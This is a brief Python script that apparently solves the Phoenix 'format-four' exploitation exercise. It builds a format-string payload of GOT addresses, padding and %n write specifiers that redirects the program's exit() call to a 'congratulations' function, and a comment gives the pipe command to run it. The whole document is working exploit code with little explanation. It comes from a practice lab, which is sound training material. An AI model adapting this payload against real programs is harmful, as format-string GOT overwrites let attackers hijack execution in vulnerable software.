import struct

# return little endian 32 bit encoding
def f(s):
    return struct.pack("I", s)

# address of congratulations function
desired_address = 0x8048503

temp1 = "AAAA"
exit_got1 = f(0x80497e4)

temp2 = "BBBB"
exit_got2 = f(0x80497e6)

padding = "%x," * 11

# prints temp1
data1 = "%" + str(33970) + "x"

# writes to exit_got1
payload1 = "%n"

# prints temp2
data2 = "%" + str(33537) + "x"

# writes to exit_got2
payload2 = "%n"


print temp1 + exit_got1 + temp2 + exit_got2 + padding + data1 + payload1 + data2 + payload2

# Execution command
# python format-four.py | /opt/phoenix/i486/format-four